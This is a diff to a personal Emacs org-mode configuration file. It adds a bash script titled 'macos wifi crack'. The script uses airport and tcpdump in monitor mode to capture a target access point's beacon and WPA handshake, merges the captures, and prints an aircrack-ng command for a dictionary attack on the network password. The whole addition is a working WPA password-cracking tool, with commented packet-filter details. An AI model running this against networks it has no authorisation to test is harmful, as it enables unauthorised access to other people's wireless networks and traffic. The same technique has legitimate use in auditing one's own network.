@@ -547,3 +547,109 @@
     #+END_SRC
     
 
+*** macos wifi crack
+    #+BEGIN_SRC shell :eval never :exports code :tangle (or (and (eq m/os 'macos) (m/resolve "${m/home.d}/.local/bin/wcrack")) "no") :tangle-mode (identity #o755) :noweb yes
+      #!/bin/bash
+      FILEPATH=$(realpath $(dirname $0))
+      PROJECT_PATH=$(realpath "${FILEPATH}/..")
+      set -eo pipefail
+      export PATH="/usr/local/opt/gnu-getopt/bin:$PATH"
+      GETOPT_ARGS=`getopt -o:s:dh -l debug,help, -- "$@"`
+      eval set -- "$GETOPT_ARGS"
+
+      usage() {
+          >&2 echo "Usage: $0 -h|--help -d|--debug <bssid> <channel> <interface> <outfile>"
+          >&2 echo "    To get <bssid>     : sudo airport -s"
+          >&2 echo "    To get <channel>   : sudo airport -s"
+          >&2 echo "    To get <interface> : route -n get default|awk -F':' '/interface/{print $2}'"
+      }
+
+      while [ -n "$1" ]
+      do
+          case "$1" in
+              -d|--debug)
+                  set -x;
+                  debug=1;
+                  shift;
+                  ;;
+              -h|--help)
+                  usage;
+                  exit 0;
+                  ;;
+              --)
+                  shift;
+                  break;
+                  ;;
+          esac
+      done
+
+      if [ "$#" -ne 4 ]; then
+          usage
+          exit 1
+      fi
+
+      BSSID=$1
+      CHANNEL=$2
+      INTERFACE=$3
+      OUTFILE=$4
+
+      # disassociate
+      sudo airport -z
+      # set the channel
+      # DO NOT PUT SPACE BETWEEN -c and the channel
+      # for example sudo airport -c6
+      sudo airport -c$CHANNEL
+      # capture a beacon frame from the AP
+
+      # type mgt subtype beacon == IEEE  802.11  frame  type  matches  the  specified wlan_type.  
+      # syntax: type wlan_type subtype wlan_subtype
+      #    True  if  the  IEEE  802.11  frame  type  matches  the specified
+      #    wlan_type and frame subtype matches the specified wlan_subtype.
+
+      #    Valid wlan_types are: mgt, ctl and data.
+      #    
+      #    If the specified wlan_type is mgt, then valid wlan_subtypes are:
+      #    assoc-req,  assoc-resp,  reassoc-req,  reassoc-resp,  probe-req,
+      #    probe-resp, beacon, atim, disassoc, auth and deauth.
+      #    
+      #    If the specified wlan_type is ctl, then valid wlan_subtypes are:
+      #    bar, ba, ps-poll, rts, cts, ack, cf-end and cf-end-ack.
+      #    
+      #    If  the  specified  wlan_type  is data, then valid wlan_subtypes
+      #    are: data, data-cf-ack,  data-cf-poll,  data-cf-ack-poll,  null,
+      #    cf-ack,   cf-poll,   cf-ack-poll,   qos-data,   qos-data-cf-ack,
+      #    qos-data-cf-poll,  qos-data-cf-ack-poll,  qos,  qos-cf-poll  and
+      #    qos-cf-ack-poll.
+      # -c <count>              == exit after receiving count packages
+      # -I                      == monitor mode
+      # see https://www.tcpdump.org/manpages/pcap-filter.7.txt for packet filter syntax
+      captured_beacon=$(mktemp /tmp/XXXXXX.cap)
+      sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i ${INTERFACE} -w ${captured_beacon}
+
+      # wait for the WPA handshake
+      # -I                 == monitor mode
+      # -U                 == packet buffered
+      # -vvv               == Event more verbose output
+      # -i <interface>     == interface
+      # -w <outfile>       == write the raw packets to file rather print it to stdout
+      # ether proto 0x888e == EAP over LAN (Extensible Authentication Protocol over Local Area Network) == EAPoL
+      # ether proto see https://en.wikipedia.org/wiki/EtherType
+      # ether host $BSSID  == ether src host $BSSID or ether dst host $BSSID
+      # see https://www.ibm.com/docs/en/qsip/7.4?topic=queries-berkeley-packet-filters
+      # see https://www.tcpdump.org/manpages/pcap-filter.7.txt for packet filter syntax
+      captured_handshake=$(mktemp /tmp/XXXXXX.cap)
+      sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -c 8 -i ${INTERFACE} -w ${captured_handshake}
+      sudo airport -z
+
+      # merge beacon.cap handshake.cap to capture.cap
+      # -a               == cause the frame timestamps to be ignored, write all packets from first input file followed by all the packets from the second input file
+      # -F <file format> == Set the file format of the output capture file
+      # -w <outfile>|-   == set the output filename or -(stdout)
+      mkdir -p $(dirname $(realpath ${OUTFILE})) || (echo "can not mkdir for outfile" && exit 1)
+      mergecap -a -F pcap -w ${OUTFILE} ${captured_beacon} ${captured_handshake}
+
+      >&2 echo "Crack with following command"
+      >&2 echo "    aircrack-ng $(realpath ${OUTFILE}) -b ${BSSID} -e ${INTERFACE} -w </path/to/your/dict>"
+
+
+    #+END_SRC
